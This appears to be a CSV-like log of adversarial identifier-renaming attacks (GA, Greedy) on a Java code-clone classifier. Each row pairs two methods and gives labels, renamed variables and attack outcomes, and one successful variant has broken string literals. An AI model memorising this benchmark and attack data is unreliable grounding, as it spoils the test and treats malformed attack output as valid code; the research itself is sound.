            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 1, 'leaf', 'leaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 2, 'knife', 'knives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 3, 'elf', 'elves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 4, 'half', 'halves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 5, 'loaf', 'loaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 6, 'shelf', 'shelves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 7, 'wife', 'wives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 8, 'person', 'people', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 9, 'deer', 'deer', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 10, 'child', 'children', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 11, '*Co', '*Coes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 12, '*s', '*ses', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 13, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 14, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 15, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 16, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 17, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 18, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (1, '$N[.N]', 'D+', 100, 'money')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (2, 'N/N/N', 'D+', 200, 'date')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (3, '[/](C/)C', 'D+', 300, 'unix path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (4, '[A:](C\\\\)C', 'D+', 400, 'dos path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (5, 'N:N', 'D+', 500, 'time')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (6, 'N.N.N.N', 'D+', 600, 'internet')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (7, 'E(.E)', 'D+', 700, 'hostname')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (8, '{+-}N[.N]', 'D+', 800, 'number')"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('i', 1, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('we', 1, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('they', 3, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('he', 3, 1, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('she', 3, 2, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('it', 3, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('you', 2, 3, FALSE)"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('actor')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('origin')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('destination')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('object')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('instrument')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('beneficiary')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('location')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('throw', 'actor', 'destination', 'object')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('melt', 'actor', '', '')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('kill', 'actor', '', 'object')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('with', 200, 'instrument')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('at', 1, 'location')"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('the', 1)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('a', 2)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('an', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('S', 1)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PN', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('DO', 3)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('IO', 4)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PO', 5)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('NP', 6)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('AV', 7)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('LV', 8)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PREP', 9)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('D', 10)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADJ', 11)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADV', 12)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('CONJ', 13)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('INTJ', 14)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PA', 15)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('HV', 16)"");
            stmt.executeQuery(""select setval('instructions_instructionid_seq', 1)"");
            int next = 2;
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'throw', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'test', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'actor', 1, 'hasa', '300', '')"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'instrument', 3, null, null, 'blue')"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (1, null, null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'get', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'drop', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 1, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 2, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 1, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 2, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 1, "" + (next + 2) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 2, "" + (next + 3) + "")"");
            stmt.executeQuery(""select setval('transactions_transactionid_seq', 1)"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 4) + "", 'throw something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 5) + "", 'get something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 6) + "", 'drop something')"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'actor', 1, 'hasa', 'object', '', 3)"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'object', 4, '', '', 'heavy', 4)"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'object', "" + (next + 6) + "")"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'destination', "" + (next + 5) + "")"");
            stmt.executeQuery(""select setval('verbtransactions_verbid_seq', 1)"");
            stmt.executeUpdate(""insert into VerbTransactions (VerbString, MoodType, TransactionId) values ('throw', 2, 2)"");
            stmt.executeUpdate(""insert into VerbConstraints (VerbId, FrameSlot, ObjectId) values (2, 'object', 200)"");
            stmt.executeUpdate(""update SystemProperties set value = 'Play Data' where name = 'DB Data Version'"");
            conn.commit();
        } catch (SQLException e) {
            if (conn != null) conn.rollback();
            throw e;
        } finally {
            if (stmt != null) stmt.close();
            if (conn != null) conn.close();
        }
    }
 <SPLIT>     public int updateuser(User u) {
        int i = 0;
        Connection conn = null;
        PreparedStatement pm = null;
        try {
            conn = Pool.getConnection();
            conn.setAutoCommit(false);
            pm = conn.prepareStatement(""update user set username=?,passwd=?,existstate=?,management=? where userid=?"");
            pm.setString(1, u.getUsername());
            pm.setString(2, u.getPasswd());
            pm.setInt(3, u.getExiststate());
            pm.setInt(4, u.getManagement());
            pm.setString(5, u.getUserid());
            i = pm.executeUpdate();
            conn.commit();
            Pool.close(pm);
            Pool.close(conn);
        } catch (Exception e) {
            e.printStackTrace();
            try {
                conn.rollback();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
            Pool.close(pm);
            Pool.close(conn);
        } finally {
            Pool.close(pm);
            Pool.close(conn);
        }
        return i;
    }
",2154,,LABEL_1,LABEL_0,,-4,"load,conn,stmt",,,,0,,0,Greedy,1,0.002471896012624105,,[]
361,"    public static XMLConfigurator loadFromSystemProperty(String propertyName) throws IOException {
        String urlStr = System.getProperty(propertyName);
        if (urlStr == null || urlStr.length() == 0) {
            return null;
        }
        InputStream in = null;
        DOMRetriever xmlDoc = null;
        try {
            URL url = new URL(urlStr);
            xmlDoc = new DOMRetriever(in = url.openStream());
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } finally {
            if (in != null) in.close();
        }
        return newInstance(xmlDoc);
    }
 <SPLIT>     public static String SHA1(String text) {
        byte[] sha1hash = new byte[40];
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
            sha1hash = md.digest();
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        }
        return convertToHex(sha1hash);
    }
",113,,LABEL_0,LABEL_0,LABEL_0,-1,"loadFromSystemProperty,propertyName,urlStr,in,xmlDoc,url",,,,0,,0,GA,2216,0.7857624053955078,failed,[]
362,"    public String readRemoteFile() throws IOException {
        String response = """";
        boolean eof = false;
        URL url = new URL(StaticData.remoteFile);
        InputStream is = url.openStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String s;
        s = br.readLine();
        response = s;
        while (!eof) {
            try {
                s = br.readLine();
                if (s == null) {
                    eof = true;
                    br.close();
                } else response += s;
            } catch (EOFException eo) {
                eof = true;
            } catch (IOException e) {
                System.out.println(""IO Error : "" + e.getMessage());
            }
        }
        return response;
    }
 <SPLIT>     public String md5(String plainText) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(plainText.getBytes());
        byte[] digest = md.digest();
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < digest.length; i++) {
            plainText = Integer.toHexString(0xFF & digest[i]);
            if (plainText.length() < 2) {
                plainText = ""0"" + plainText;
            }
            hexString.append(plainText);
        }
        return hexString.toString();
    }
",149,,LABEL_0,LABEL_0,LABEL_0,-1,"readRemoteFile,response,url,is,br,s,eof",,,,0,,0,GA,2532,0.9011685808499654,failed,[]
363,"    public boolean clonarFichero(FileInputStream rutaFicheroOrigen, String rutaFicheroDestino) {
        System.out.println("""");
        boolean estado = false;
        try {
            FileOutputStream salida = new FileOutputStream(rutaFicheroDestino);
            FileChannel canalOrigen = rutaFicheroOrigen.getChannel();
            FileChannel canalDestino = salida.getChannel();
            canalOrigen.transferTo(0, canalOrigen.size(), canalDestino);
            rutaFicheroOrigen.close();
            salida.close();
            estado = true;
        } catch (IOException e) {
            System.out.println(""No se encontro el archivo"");
            e.printStackTrace();
            estado = false;
        }
        return estado;
    }
 <SPLIT>     private static void downloadImages(String uriPrefix, String fileWithListOfImages, String outputDir) throws Exception {
        Properties list = new Properties();
        list.load(new FileInputStream(fileWithListOfImages));
        long current = 0;
        long startTime = System.currentTimeMillis();
        System.out.println(""Downloading files from "" + uriPrefix + "" to "" + outputDir);
        System.out.println(""Total "" + list.size() + "" files, think of 1 sec per file"");
        System.out.println(""Images with the same size as the 'no-image' image are ignored and not displayed"");
        for (Iterator<Object> it = list.keySet().iterator(); it.hasNext(); ) {
            String urlString = it.next().toString().replace('\\', '/');
            if (urlString.contains(""="")) throw new Exception(""Symbol '=' found in file names, while it is reserved for denoting '/' in flat-file names"");
        }
        for (Iterator<Object> it = list.keySet().iterator(); it.hasNext(); ) {
            String urlString = it.next().toString().replace('\\', '/');
            URL url = new URL(uriPrefix + urlString);
            File file = new File(outputDir + ""/"" + imageNameToFileName(urlString));
            current++;
            if (!file.exists()) {
                try {
                    BufferedInputStream in = new BufferedInputStream(url.openStream(), 64000);
                    BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file), 64000);
                    int c;
                    while ((c = in.read()) != -1) {
                        out.write(c);
                    }
                    out.close();
                    in.close();
                    System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", "");
                    System.out.println(""saved"");
                } catch (Exception e) {
                    System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", FAILED, error: "" + e.getMessage());
                }
            } else {
                System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", "");
                System.out.println(""already exists"");
            }
            if (current / 100 == current / 100.0) {
                long delta = (System.currentTimeMillis() - startTime);
                System.out.println(""Total time "" + delta + "" ms, "" + (delta / current) + "" ms/file"");
            }
        }
        long delta = (System.currentTimeMillis() - startTime);
        System.out.println(""Total time "" + delta + "" ms, "" + (delta / list.size()) + "" ms/file"");
    }
",120,,LABEL_0,LABEL_1,,-4,"clonarFichero,rutaFicheroOrigen,rutaFicheroDestino,salida,canalOrigen,canalDestino,estado",,,,0,,0,Greedy,1,0.0005947828292846679,,[]
364,"    private boolean copyFile(File _file1, File _file2) {
        FileInputStream fis;
        FileOutputStream fos;
        try {
            fis = new FileInputStream(_file1);
            fos = new FileOutputStream(_file2);
            FileChannel canalFuente = fis.getChannel();
            canalFuente.transferTo(0, canalFuente.size(), fos.getChannel());
            fis.close();
            fos.close();
            return true;
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
        return false;
    }
 <SPLIT>     public static void main(String[] args) {
        System.out.println(""Chapter 16: example SignedPdf"");
        System.out.println(""-> Creates a signed PDF;"");
        System.out.println(""-> jars needed: iText.jar"");
        System.out.println(""-> files generated in /results subdirectory:"");
        System.out.println(""   Resource needed: .keystore"");
        System.out.println(""-> Resulting PDFs: unsigned_message.pdf, signed_message.pdf,"");
        System.out.println(""   corrupted_message.pdf, signed_message_invisible.pdf,"");
        System.out.println(""   double_signed_message.pdf, revision_1.pdf and revision_2.pdf"");
        createPdf();
        PdfReader reader;
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setCertificationLevel(PdfSignatureAppearance.CERTIFIED_FORM_FILLING);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(30, 750, 500, 565), 1, null);
            stamper.close();
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            e.printStackTrace();
        } catch (DocumentException e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            Document document = new Document(reader.getPageSizeWithRotation(1));
            PdfCopy copy = new PdfCopy(document, new FileOutputStream(""results/in_action/chapter16/corrupted_message.pdf""));
            document.open();
            copy.addPage(copy.getImportedPage(reader, 1));
            document.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        } catch (DocumentException de) {
            de.printStackTrace();
        }
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message_invisible.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/double_signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0', null, true);
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""Double signed."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(300, 750, 500, 800), 1, ""secondsig"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            CertificateFactory cf = CertificateFactory.getInstance(""X509"");
            Collection col = cf.generateCertificates(new FileInputStream(""resources/in_action/chapter16/foobar.cer""));
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(null, null);
            for (Iterator it = col.iterator(); it.hasNext(); ) {
                X509Certificate cert = (X509Certificate) it.next();
                System.out.println(cert.getIssuerDN().getName());
                ks.setCertificateEntry(cert.getSerialNumber().toString(Character.MAX_RADIX), cert);
            }
            reader = new PdfReader(""results/in_action/chapter16/double_signed_message.pdf"");
            AcroFields af = reader.getAcroFields();
            ArrayList names = af.getSignatureNames();
            String name;
            for (Iterator it = names.iterator(); it.hasNext(); ) {
                name = (String) it.next();
                System.out.println(""Signature name: "" + name);
                System.out.println(""Signature covers whole document: "" + af.signatureCoversWholeDocument(name));
                System.out.println(""Document revision: "" + af.getRevision(name) + "" of "" + af.getTotalRevisions());
                FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/revision_"" + af.getRevision(name) + "".pdf"");
                byte bb[] = new byte[8192];
                InputStream ip = af.extractRevision(name);
                int n = 0;
                while ((n = ip.read(bb)) > 0) os.write(bb, 0, n);
                os.close();
                ip.close();
                PdfPKCS7 pk = af.verifySignature(name);
                Calendar cal = pk.getSignDate();
                Certificate pkc[] = pk.getCertificates();
                System.out.println(""Subject: "" + PdfPKCS7.getSubjectFields(pk.getSigningCertificate()));
                System.out.println(""Document modified: "" + !pk.verify());
                Object fails[] = PdfPKCS7.verifyCertificates(pkc, ks, null, cal);
                if (fails == null) System.out.println(""Certificates verified against the KeyStore""); else System.out.println(""Certificate failed: "" + fails[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",98,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,_file1,_file2,fis,fos,canalFuente",,,,0,,0,GA,1885,0.7693085551261902,failed,[]
365,"    public synchronized String encryptPassword(String passwordString) throws Exception {
        MessageDigest digest = null;
        digest = MessageDigest.getInstance(""SHA"");
        digest.update(passwordString.getBytes(""UTF-8""));
        byte raw[] = digest.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     private void tail(String[] cmd, int pos) throws IOException {
        CommandFormat c = new CommandFormat(""tail"", 1, 1, ""f"");
        String src = null;
        Path path = null;
        try {
            List<String> parameters = c.parse(cmd, pos);
            src = parameters.get(0);
        } catch (IllegalArgumentException iae) {
            System.err.println(""Usage: java FsShell "" + TAIL_USAGE);
            throw iae;
        }
        boolean foption = c.getOpt(""f"") ? true : false;
        path = new Path(src);
        FileSystem srcFs = path.getFileSystem(getConf());
        if (srcFs.isDirectory(path)) {
            throw new IOException(""Source must be a file."");
        }
        long fileSize = srcFs.getFileStatus(path).getLen();
        long offset = (fileSize > 1024) ? fileSize - 1024 : 0;
        while (true) {
            FSDataInputStream in = srcFs.open(path);
            in.seek(offset);
            IOUtils.copyBytes(in, System.out, 1024, false);
            offset = in.getPos();
            in.close();
            if (!foption) {
                break;
            }
            fileSize = srcFs.getFileStatus(path).getLen();
            offset = (fileSize > offset) ? offset : fileSize;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
",72,,LABEL_0,LABEL_0,LABEL_0,-1,"encryptPassword,passwordString,digest,raw,hash",,,,0,,0,GA,1871,0.6641984144846599,failed,[]
366,"    public void writeConfiguration(Writer out) throws IOException {
        if (myResource == null) {
            out.append(""# Unable to print configuration resource\n"");
        } else {
            URL url = myResource.getUrl();
            InputStream in = url.openStream();
            if (in != null) {
                try {
                    IOUtils.copy(in, out);
                } finally {
                    IOUtils.closeQuietly(in);
                }
            } else {
                out.append(""# Unable to print configuration resource\n"");
            }
        }
    }
 <SPLIT>     public void execute(File sourceFile, File destinationFile, String conversionType, Properties java2HtmlConfig) {
        FileReader reader = null;
        Writer writer = null;
        try {
            reader = new FileReader(sourceFile);
            logger.info(""Using source file: "" + trimPath(userDir, sourceFile));
            if (!destinationFile.getParentFile().exists()) {
                createDirectory(destinationFile.getParentFile());
            }
            writer = new FileWriter(destinationFile);
            logger.info(""Destination file:  "" + trimPath(userDir, destinationFile));
            execute(reader, writer, conversionType, java2HtmlConfig);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                    writer = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (reader != null) {
                try {
                    reader.close();
                    reader = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
",92,"    public void writeConfiguration(Writer out) throws IOException {
        if (myResource == null) {
            out.append(""# Unable to print configuration resource
"");
        } else {
            URL url = myResource.getUrl();
            InputStream copy = url.openStream();
            if (copy != null) {
                try {
                    IOUtils.copy(copy, out);
                } finally {
                    IOUtils.closeQuietly(copy);
                }
            } else {
                out.append(""# Unable to print configuration resource
"");
            }
        }
    }
",LABEL_1,LABEL_1,0.5080310702323914,1,"writeConfiguration,out,url,in",,,,7,"writeConfiguration:writeConfiguration,out:out,url:url,in:copy,",3,GA,225,0.0807771881421407,ga,[]
367,"    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String target = null;
        boolean allowedToAccess = false;
        try {
            URL requestUrl = new URL(""http:/"" + request.getPathInfo());
            for (Enumeration en = allowedUrls.elements(); en.hasMoreElements(); ) {
                URL nextUrl = (URL) en.nextElement();
                if ((nextUrl).getHost().equalsIgnoreCase(requestUrl.getHost())) {
                    allowedToAccess = true;
                }
            }
        } catch (MalformedURLException ex) {
            System.err.println(""Error in url: "" + ""http:/"" + request.getPathInfo());
            return;
        }
        if (!allowedToAccess) {
            response.setStatus(407);
            return;
        }
        if (request.getPathInfo() != null && !request.getPathInfo().equals("""")) {
            target = ""http:/"" + request.getPathInfo() + ""?"" + request.getQueryString();
        } else {
            response.setStatus(404);
            return;
        }
        InputStream is = null;
        ServletOutputStream out = null;
        try {
            URL url = new URL(target);
            URLConnection uc = url.openConnection();
            response.setContentType(uc.getContentType());
            is = uc.getInputStream();
            out = response.getOutputStream();
            byte[] buf = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buf)) != -1) {
                out.write(buf, 0, bytesRead);
            }
        } catch (MalformedURLException e) {
            response.setStatus(404);
        } catch (IOException e) {
            response.setStatus(404);
        } finally {
            if (is != null) {
                is.close();
            }
            if (out != null) {
                out.close();
            }
        }
    }
 <SPLIT>     public static InputStream getConfigIs(String path, String name) throws ProgrammerException, DesignerException, UserException {
        InputStream is = null;
        try {
            URL url = getConfigResource(new MonadUri(path).append(name));
            if (url != null) {
                is = url.openStream();
            }
        } catch (IOException e) {
            throw new ProgrammerException(e);
        }
        return is;
    }
",369,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,request,response,target,requestUrl,en,nextUrl,allowedToAccess,is,out,url,uc,buf,bytesRead",,,,0,,0,GA,5176,1.8994179407755534,failed,[]
368,"    public void uncaughtException(final Thread t, final Throwable e) {
        final Display display = Display.getCurrent();
        final Shell shell = new Shell(display);
        final MessageBox message = new MessageBox(shell, SWT.OK | SWT.CANCEL | SWT.ICON_ERROR);
        message.setText(""Hawkscope Error"");
        message.setMessage(e.getMessage() + ""\nSubmit Hawkscope Error Report to Issue Tracker?"");
        log.error(""Uncaught exception"", e);
        if (message.open() == SWT.OK) {
            IOUtils.copyToClipboard(Version.getBugReport(e));
            try {
